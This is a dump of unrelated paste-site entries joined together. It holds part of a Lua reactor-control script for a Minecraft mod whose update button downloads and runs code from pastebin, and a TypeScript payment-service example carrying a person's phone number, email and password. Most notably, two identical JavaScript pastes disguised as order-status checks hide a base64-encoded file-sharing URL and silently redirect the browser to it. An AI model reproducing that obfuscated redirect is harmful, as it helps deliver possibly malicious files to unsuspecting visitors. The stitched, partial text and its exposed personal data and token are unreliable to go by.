	if newTemp > 8000 and Mode == 1 then
		newTemp = 8000
	elseif newTemp > 15000 then
		newTemp = 15000
	elseif newTemp < 2000 then
		newTemp = 2000
	end
		idealTemp = newTemp
	end

	-- Field Strength Controls
function modifyField(offset)
	local newField = idealField + offset
	if newField > 99 then
		newField = 99
	elseif newField < 99 and chaosMode == 1 then
		newField = 99
	elseif newField < 1.0 and Mode == 1 or Mode == 3 then
		newField = 1.0
	elseif newField < 0.5 and Mode == 2 then
		newField = 0.5
	end
		idealField = newField
	end

local eventLoop = true

	-- Reactor Management Calculations
function primaryCalculations()
	while eventLoop do
		info = reactor.getReactorInfo()
		-- Reactor equation variables
	local targetTemp50  = math.min((targetTemp / 10000) * 50, 99)
	local convLVL       = (info.fuelConversion / info.maxFuelConversion * 1.3) - 0.3
	-- Calculate the temperature rise resistance for the reactor at the desired temperature.
	local targetTempResist = ((targetTemp50^4) / (100 - targetTemp50))
	-- Calculate the temperature rise exponential needed to reach the desired temperature
	local targetTempExpo = -(targetTempResist*convLVL) - 1000*convLVL + targetTempResist
	-- Calculate the saturation level needed to produce the required tempRiseExpo
	local term1 = 1334.1-(3*targetTempExpo)
	local term2 = (1200690-(2700*targetTempExpo))^2
	local term3 = ((-1350*targetTempExpo)+(((-4*term1^3+term2)^(1/2))/2)+600345)^(1/3)
	local targetNegCSat = -(term1/(3*term3))-(term3/3)
	-- Saturation received from above equation needs to be reformatted to a more useful form
	local targetCoreSat = 1 - (targetNegCSat/99)
	local targetSat = targetCoreSat * info.maxEnergySaturation
	-- Calculate the difference between where saturation is and where it needs to be
	local saturationError = info.energySaturation - targetSat
	local requiredOutput = math.min(saturationError, info.maxEnergySaturation / 40) --+ info.generationRate
	-- Calculate field input
	local fieldNegPercent = 1 - targetField
	local fieldStrengthError = (info.maxFieldStrength * targetField) - info.fieldStrength
	local requiredInput = math.min(fieldStrengthError + (info.maxFieldStrength * info.fieldDrainRate) / (info.maxFieldStrength - info.fieldStrength) - info.fieldDrainRate + 1, info.maxFieldStrength - info.fieldStrength)
	if info.status == ""warming_up"" then
		if info.fuelConversion / info.maxFuelConversion > targetFuel then
			reactor.stopReactor()
			else
				if info.temperature >= 2000 then
				reactor.activateReactor()
			else
				setReactorOutput(0)
				setReactorInput(5000000)
				end
		end

	elseif info.status == ""running"" then
		if info.fuelConversion / info.maxFuelConversion > targetFuel then
			reactor.stopReactor()
		end
		setReactorOutput(requiredOutput)
		setReactorInput(requiredInput)
	elseif info.status == ""stopping"" then
		setReactorOutput(0)
		setReactorInput(requiredInput)
	end
    --print(""primaryCalculations okay"")
    os.sleep(0.01)
end
print(""primaryCalculations thread exited"")
end

	-- UI Related Calculations
function secondaryCalculations()
	while eventLoop do

-- Safety Measures

	if info.status == ""running"" then
    if info.temperature > cutoffTemp then
        print(""Reactor Too Hot, shutting down"")
        reactor.stopReactor()
    end
    if ((info.fieldStrength / info.maxFieldStrength) * 100) < cutoffField then
        print(""Reactor Field Has Failed, Failsafe Activated, Shutting Down"")
        reactor.stopReactor()
    end
    if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) < 0.2 then
        print(""Reactor Fuel Low, Shutting Down"")
		reactor.stopReactor()
    end
   end

-- Set Secondary Calculations

	-- Get Temp Rise
oldTemp = currentTemp or info.temperature
currentTemp = info.temperature
oldTempRate = tempChangeRate or currentTemp - oldTemp
tempChangeRate = currentTemp - oldTemp
tempAccel = tempChangeRate - oldTempRate
if tempAccel == 0 then
	tempAccel = 0.001
end

	-- Get Fuel Use Rate
oldFuel = currentFuel or (info.maxFuelConversion - info.fuelConversion)
currentFuel = (info.maxFuelConversion - info.fuelConversion)
oldUseRate = fuelUseRate or math.max(info.fuelConversionRate*20, 0.1)
fuelUseRate = math.max(info.fuelConversionRate*20, 0.1)
fuelAccel = math.max(fuelUseRate - oldUseRate, 0.1)

	-- Change Fuel Conversion Units
if info.fuelConversionRate > 249999 then
	fuelConversionRate = ((info.fuelConversionRate / (info.maxFuelConversion * 1000000)) * 2000)
	fuelMeasure = ""  %%/s""
elseif info.fuelConversionRate > 999 then
	fuelConversionRate = (info.fuelConversionRate / 1000)
	fuelMeasure = "" ""..(unicode.char(956))..""b/t""
elseif info.fuelConversionRate > 999999 then
	fuelConversionRate = (info.fuelConversionRate / 1000000)
	fuelMeasure = "" mb/t""
else
	fuelConversionRate = info.fuelConversionRate
	fuelMeasure = "" nb/t""
end

	-- Get Time Until Cool
if info.fuelConversionRate < 1 then
	tempDrain = ((info.temperature - 2000) / 0.4)
else
	tempDrain = 1
end

	-- Get Equivalent Solar Fusion Stage
if ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 20 then burnStage = ""H""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 15 then burnStage = ""He""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 10 then burnStage = ""C""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 8 then burnStage = ""Ne""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 5.5 then burnStage = ""O""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 2.5 then burnStage = ""Si""
elseif ((1 - info.fuelConversion / info.maxFuelConversion) * 100) > 1 then burnStage = ""Fe""
end

	-- Get Field Deviation
if ((info.fieldStrength / info.maxFieldStrength) * 100) > idealField then
	deviation = (((info.fieldStrength / info.maxFieldStrength) * 100)) - idealField
elseif ((info.fieldStrength / info.maxFieldStrength) * 100) < idealField then
	deviation = idealField - (((info.fieldStrength / info.maxFieldStrength) * 100))
end

	-- Get Time Until Refuel
	local secondsToExpire = (info.maxFuelConversion - info.fuelConversion) / math.max(info.fuelConversionRate*0.00002, 0.00001)
end
print(""secondaryCalculations thread exited"")
end

	-- Draw GUI
function drawGUI()

	-- Button Array
local buttons = {
	startButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Start"",
	textcolor = 0x0000AA,
    action=function()
      if info.status == ""cooling"" or info.status == ""cold"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.chargeReactor()
      elseif info.status == ""stopping"" then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
			cVar = ""Do not use Chaos Mode with less than one block of fuel""
        reactor.activateReactor()
      end
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  shutdownButton={
    x=2,
    y=20,
    width=18,
    height=1,
    text=""Shutdown"",
	textcolor = 0xAA0000,
    action=function()
    cutoffTemp = 9000
    idealTemp = Arg1
    idealField = Arg2
    cutoffField = 0.4
	chaosMode = 0
	cVar = ""Do not use Chaos Mode with less than one block of fuel""
      state = ""MASD""
      reactor.stopReactor()
    end,
	condition=function() return info.status == ""running"" or info.status == ""warming_up"" end
  },
  chaosMode={
    x=2,
    y=22,
    width=18,
    height=1,
    text="" Chaos Mode"",
	textcolor = 0x800080,
    action=function()
		if chaosMode == 0 then
			chaosMode = 1
			cutoffTemp = 19750
			idealField = 99
			cutoffField = 5
			idealTemp = 55537.78
		elseif chaosMode == 1 then
			chaosMode = 0
			idealField = Arg2
			cutoffField = 0.4
			idealTemp = Arg1
		end
    end,
    condition=function() return Mode == 2 and info.status == ""running"" end
  },
  forceExit={
    x=158,
    y=1,
    width=3,
    height=1,
    text="" X "",
	textcolor = 0xB00000,
    action=function()
		inputFlux.setFlowOverride(250000)
		chaosMode = 0
		idealField = 99
		cutoffField = 0.4
		idealTemp = Arg1
      reactor.stopReactor()
      gpu.setResolution(gpu.maxResolution())
	  event_loop = false
	  os.execute(""cls"")
    end,
--    condition=function() return running or shutting_down end
  },
  Update={
    x=22,
    y=22,
    width=18,
    height=1,
    text=""Update"",
    action=function()
		reactor.stopReactor()
		os.execute(""cd /home; pastebin get -f hh14Sxhi dc15; cls; dc15"")
    end,
	condition=function() return info.status ~= ""running"" and info.status ~= ""warming_up"" end
  },
  switchGates={
    x=2,
    y=22,
    width=18,
    height=1,
    text=""Swap Flux Gates"",
    action=function()
      cutoffTemp = 10500
      local old_addr = inputFlux.address
      inputFlux = component.proxy(outputFlux.address)
      outputFlux = component.proxy(old_addr)
    end,
	condition=function() return info.status == ""cooling"" or info.status == ""cold"" or info.status == ""stopping"" end
  },
  tempMax={
    x=tempOffsetX,
    y=tempOffsetY,
    width=adj_button_width,
    height=1,
    text=""Maximum"",
	textcolor = 0x552222,
    action=function()
    idealTemp = 8000 end
  },
  tempPThousand={
    x=tempOffsetX,
    y=tempOffsetY+2,
    width=adj_button_width,
    height=1,
    text=""+1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(1000) end
  },
  tempPHundred={
    x=tempOffsetX,
    y=tempOffsetY+4,
    width=adj_button_width,
    height=1,
    text=""+100"",
	textcolor = 0x552222,
    action=function() modifyTemp(100) end
  },
  tempPTen={
    x=tempOffsetX,
    y=tempOffsetY+6,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x552222,
    action=function() modifyTemp(10) end
  },
  tempPOne={
    x=tempOffsetX,
    y=tempOffsetY+8,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x552222,
    action=function() modifyTemp(1) end
  },
  tempMin={
    x=tempOffsetX,
    y=tempOffsetY+20,
    width=adj_button_width,
    height=1,
    text=""Minimum"",
	textcolor = 0x552222,
    action=function() modifyTemp(-20000) end
  },
  tempMThousand={
    x=tempOffsetX,
    y=tempOffsetY+18,
    width=adj_button_width,
    height=1,
    text=""-1000"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1000) end
  },
  tempMHundred={
    x=tempOffsetX,
    y=tempOffsetY+16,
    width=adj_button_width,
    height=1,
    text=""-100"",
	textcolor = 0x552222,
    action=function() modifyTemp(-100) end
  },
  tempMTen={
    x=tempOffsetX,
    y=tempOffsetY+14,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x552222,
    action=function() modifyTemp(-10) end
  },
  tempMOne={
    x=tempOffsetX,
    y=tempOffsetY+12,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x552222,
    action=function() modifyTemp(-1) end
  },
  fieldPTen={
    x=fieldOffsetX,
    y=fieldOffsetY+1,
    width=adj_button_width,
    height=1,
    text=""+10"",
	textcolor = 0x222299,
    action=function() modifyField(10) end
  },
    fieldPOne={
    x=fieldOffsetX,
    y=fieldOffsetY+3,
    width=adj_button_width,
    height=1,
    text=""+1"",
	textcolor = 0x222299,
    action=function() modifyField(1) end
  },
  fieldPTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+5,
    width=adj_button_width,
    height=1,
    text=""+0.1"",
	textcolor = 0x222299,
    action=function() modifyField(0.1) end
  },
    fieldPThou={
    x=fieldOffsetX,
    y=fieldOffsetY+7,
    width=adj_button_width,
    height=1,
    text=""+0.005"",
	textcolor = 0x222299,
    action=function() modifyField(0.005) end
  },
  fieldMTen={
    x=fieldOffsetX,
    y=fieldOffsetY+19,
    width=adj_button_width,
    height=1,
    text=""-10"",
	textcolor = 0x222299,
    action=function() modifyField(-10) end
  },
    fieldMOne={
    x=fieldOffsetX,
    y=fieldOffsetY+17,
    width=adj_button_width,
    height=1,
    text=""-1"",
	textcolor = 0x222299,
    action=function() modifyField(-1) end
  },
  fieldMTenth={
    x=fieldOffsetX,
    y=fieldOffsetY+15,
    width=adj_button_width,
    height=1,
    text=""-0.1"",
	textcolor = 0x222299,
    action=function() modifyField(-0.1) end
   },
     fieldMThou={
    x=fieldOffsetX,
    y=fieldOffsetY+13,
    width=adj_button_width,
    height=1,
    text=""-0.005"",
	textcolor = 0x222299,
    action=function() modifyField(-0.005) end
   }
}

	-- Draw Relevant Data For GUI
while eventLoop do
	if term.isAvailable() and Mode ~= 3 then
			function modify_eff(offset)
				local eff = ((outputFlux / inputFlux) * 100)
				if eff > 100000 then
				eff = 1
			end
		end
		local left_margin = 2
		local spacing = 1
		local values = {
					""Draconic Control™  [v15.1 sMAT | hh14Sxhi]"",
					"" "",
					""┌──────────────────Reactor Statistics────────────────────┐"",
	string.format(""│Time Until Refuel:         │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", secondsToExpire/86400, secondsToExpire   /3600 % 24, secondsToExpire/60 % 60, secondsToExpire % 60),
	string.format(""│Time Until Cool:           │  %5.0fd, %2.0fh, %2.0fm, %2.0fs     │"", tempDrain/86400, tempDrain   /3600 % 24, tempDrain/60 % 60, tempDrain % 60),
	string.format(""│Ideal Field:               │           %8.3f%%        │"", idealField),
	string.format(""│Current Field:             │           %8.3f%%        │"", ((info.fieldStrength / info.maxFieldStrength) * 100) + 0.122),
					""├───────────────────────────┼────────────────────────────┤"",
	string.format(""│Fuel Remaining:            │           %7.3f%%         │"", ((1 - info.fuelConversion / info.maxFuelConversion) * 100)),
	string.format(""│Fuel Use Rate:             │           %7.3f"" .. fuelMeasure .. ""     │"", fuelConversionRate),
					""├───────────────────────────┼────────────────────────────┤"",
	string.format(""│Temperature                │   %7.1f°c [%8.1f°f]   │"", info.temperature, ((info.temperature * 1.8) + 32)),
	string.format(""│Ideal Temperature:         │   %7.1f°c [%8.1f°f]   │"", idealTemp, ((idealTemp * 1.8) + 32)),
					""├───────────────────────────┼────────────────────────────┤"",
	string.format(""│Energy Input:              │   %12.1f RF/t        │"", requiredInput),
	string.format(""│Energy Output:             │   %12.1f RF/t        │"", outputFlux.getFlow()),
					""└───────────────────────────┴────────────────────────────┘"",
					"" "" .. cVar,
					"" ""
	}
		local values2 = {
				""Eq. Fusion Stage     "" .. burnStage,
	string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
	string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
	string.format(""Temperature Rise: %4.3f"", tempAccel),
	string.format(""Temp Resist for target temp %d (%d): %.2f"", idealTemp, targetTemp50, targetTempResist),
	string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
	string.format(""Saturation needed for zero rise: %d (%3.2f%%)"", targetSat, targetCoreSat*100),
	string.format(""Error between current saturation and target saturation: %d\n"", saturationError),
	string.format(""Current field drain is %d RF/t"", info.fieldDrainRate),
	string.format(""Current temp drain factor for temp %d is %1.2f"", info.temperature, tempDrainFactor),
	string.format(""fieldNegPercent is %d"", fieldNegPercent),
	string.format(""Required input to counter field drain: %d RF/t\n"", requiredInput),
	string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
	string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
	string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
	}
	
	term.clear()
	
	if Mode == 2 and Mode ~= 3 then
		for i, v in ipairs(values2) do
			term.setCursor(left_margin, i * spacing)
			term.write(v)
		end
	end
	if Mode ~= 3 then
		for i, v in ipairs(values) do
			term.setCursor(left_margin, i * spacing)
			term.write(v)
		end
	end
	
	-- Draw Buttons For GUI
	term.setCursor(tempOffsetX, tempOffsetY+10)
	term.write(""Reactor Temperature"")
	term.setCursor(fieldOffsetX+1, fieldOffsetY+10)
	term.write(""  Field Strength"")
	gpu.setForeground(0xFFFFFF)
	for bname, button in pairs(buttons) do
		gpu.setForeground(0x000000)
		if button.depressed then
			button.depressed = button.depressed - 1
			if button.depressed == 0 then
				button.depressed = nil
			end
		end
		if button.condition == nil or button.condition() then
			local centerColor = 0xBBBBBB
			local highlightColor = 0xCCCCCC
			local lowlightColor = 0x808080
			if button.depressed then
				centerColor = 0xAAAAAA
				highlightColor = 0x707070
				lowlightColor = 0xBBBBBB
			end
			gpu.setBackground(centerColor)
			gpu.fill(button.x, button.y, button.width, button.height, "" "")
			if button.width > 1 and button.height > 1 then
				gpu.setBackground(lowlightColor)
				gpu.fill(button.x+1, button.y+button.height-1, button.width-1, 1, "" "")
				gpu.fill(button.x+button.width-1, button.y, 1, button.height, "" "")
				gpu.setBackground(highlightColor)
				gpu.fill(button.x, button.y, 1, button.height, "" "")
				gpu.fill(button.x, button.y, button.width, 1, "" "")
			end
			gpu.setBackground(centerColor)
			if button.textcolor then
				gpu.setForeground(button.textcolor)
			end
			term.setCursor(button.x + math.floor(button.width / 2 - #button.text / 2), button.y + math.floor(button.height / 2))
			term.write(button.text)
		end
	end
	gpu.setBackground(0x777777)
	gpu.setForeground(0x000000)
	end
	
	-- Write Relevant Values For CLI
	if term.isAvailable() and Mode == 3 then
		local left_margin = 2
		local spacing = 1
		local values3 = {
		""Eq. Fusion Stage     "" .. burnStage,
		string.format(""Max Fuel [nb]:       %4.3f"", (info.maxFuelConversion * 1000000)),
		string.format(""Fuel Remaining [nb]: %4.3f"", ((info.maxFuelConversion - info.fuelConversion) * 1000000)),
		string.format(""Temperature Rise: %4.3f"", tempAccel),
		string.format(""Temp Resist for target temp %d (%d): %.2f"", idealTemp, targetTemp50, targetTempResist),
		string.format(""Temp expo for convLVL %.2f: %.2f"", convLVL, targetTempExpo),
		string.format(""Saturation needed for zero rise: %d (%3.2f%%)"", targetSat, targetCoreSat*100),
		string.format(""Error between current saturation and target saturation: %d\n"", saturationError),
		string.format(""Current field drain is %d RF/t"", info.fieldDrainRate),
		string.format(""Current temp drain factor for temp %d is %1.2f"", info.temperature, tempDrainFactor),
		string.format(""fieldNegPercent is %d"", fieldNegPercent),
		string.format(""Required input to counter field drain: %d RF/t\n"", requiredInput),
		string.format(""Field Deviation: "" .. unicode.char(8776) .. deviation .. ""%%""),
		string.format(""Input Flux Gate:  ["" .. inputFlux.address .. ""] Set To: "" .. inputFlux.getFlow()),
		string.format(""Output Flux Gate: ["" .. outputFlux.address .. ""] Set To: "" .. outputFlux.getFlow())
	}
		for i, v in ipairs(values3) do
			term.setCursor(left_margin, i * spacing)
			term.write(v)
		end
	end
-- print(drawGUI okay)
end
os.sleep(0.1)
print(""drawGUI thread exited"")
end

	-- Parse User Input
function parseInput()
	while eventLoop do
		-- Wait for next tick, or manual shutdown
	
		local event, id, op1, op2 = event.pull(0.01)
		if event == ""interrupted"" then
		eventLoop = false
		thread.current():join()
		elseif event == ""touch"" then

		-- Handle Button Presses
		local x = op1
		local y = op2
		for bname, button in pairs(buttons) do
			if (button.condition == nil or button.condition()) and x >= button.x and x <= button.x + button.width and y >= button.y and y <= button.y + button.height then
			button.action()
			button.depressed = 3
			end
		end
		end
		
		--print(""parseInput okay"")
	end
	print(""parseInputThread exited"")
end

local primaryCalculationsThread = thread.create(primaryCalculations)
local secondaryCalculationsThread = thread.create(secondaryCalculations)
local drawGUIThread = thread.create(drawGUI)
local parseInputThread = thread.create(parseInput)
thread.waitForAny({primaryCalculationsThread, secondaryCalculations, drawGUIThread, parseInputThread})
--drawUI()
eventLoop = false
reactor.stopReactor()
term.clear()
term.setCursor(1,1)
local maxX, maxY = gpu.maxResolution()
gpu.setResolution(maxX,maxY)
print(""Exited"")
::fin::"
aZQF09nC,Paytech Service Use,sidson,TypeScript,Sunday 6th of April 2025 12:01:34 AM CDT,"import { Container } from 'inversify';
import 'reflect-metadata';
import { PayTechService, PaytechRegisterRequest } from './paytech-service';

// Set up dependency injection container
const container = new Container();
container.bind(PayTechService).toSelf();

// Get an instance of the service
const paytechService = container.get(PayTechService);

/**
 * Example 1: Register a new customer
 */
async function registerExample() {
  const registerRequest: PaytechRegisterRequest = {
    fname: ""Moussa"",
    lname: ""Ndour"", 
    phone: ""+221777679700"",
    countryCode: ""sn"",
    email: ""moussa_ndour@hotmail.fr"",
    adress: ""Almadies"",
    pass: ""azerty"",
    confPass: ""azerty"",
    business_name: ""Mon Business"",
    website: ""https://github.com/touskar"", //optionnel can send """"
    type_acount: ""simple"", // simple => Business(Pas de site web), pro => Site E-Commerce (Pour les sites web)
    promo_code: """",
    day_get_funds: ""Mardi""
  };

  try {
    const response = await paytechService.register(registerRequest);
    
    if (response.isSuccess) {
      console.log(""Registration successful!"");
      console.log(""Message:"", response.message);
    } else {
      console.error(""Registration failed!"");
      console.error(""Error message:"", response.message);
    }
  } catch (error) {
    console.error(""Exception occurred during registration:"", error);
  }
}

/**
 * Example 2: Login to get customer information
 */
async function loginExample() {
  const email = ""moussa_ndour@hotmail.fr"";
  const password = ""azerty"";

  try {
    const response = await paytechService.getCustomerInfo(email, password);
    
    if (response.isSuccess && response.customerInfo) {
      console.log(""Login successful!"");
      console.log(""Customer name:"", `${response.customerInfo.customer.firstName} ${response.customerInfo.customer.lastName}`);
      console.log(""Business name:"", response.customerInfo.customer.businessName);
      console.log(""Account balance:"", response.customerInfo.customer.balance.amount);
      console.log(""Account type:"", response.customerInfo.customer.accountType);
    } else {
      console.error(""Login failed!"");
      console.error(""Error message:"", response.message);
    }
  } catch (error) {
    console.error(""Exception occurred during login:"", error);
  }
}

// Run the examples
(async () => {
  console.log(""===== Register Example ====="");
  await registerExample();
  
  console.log(""\n===== Login Example ====="");
  await loginExample();
})();"
KnrXdrs5,Market.js,rodrigomaise99,JavaScript,Saturday 5th of April 2025 11:57:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/14018/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JL3zx6ns,Untitled,rodrigomaise99,JavaScript,Saturday 5th of April 2025 11:41:53 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/91852/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
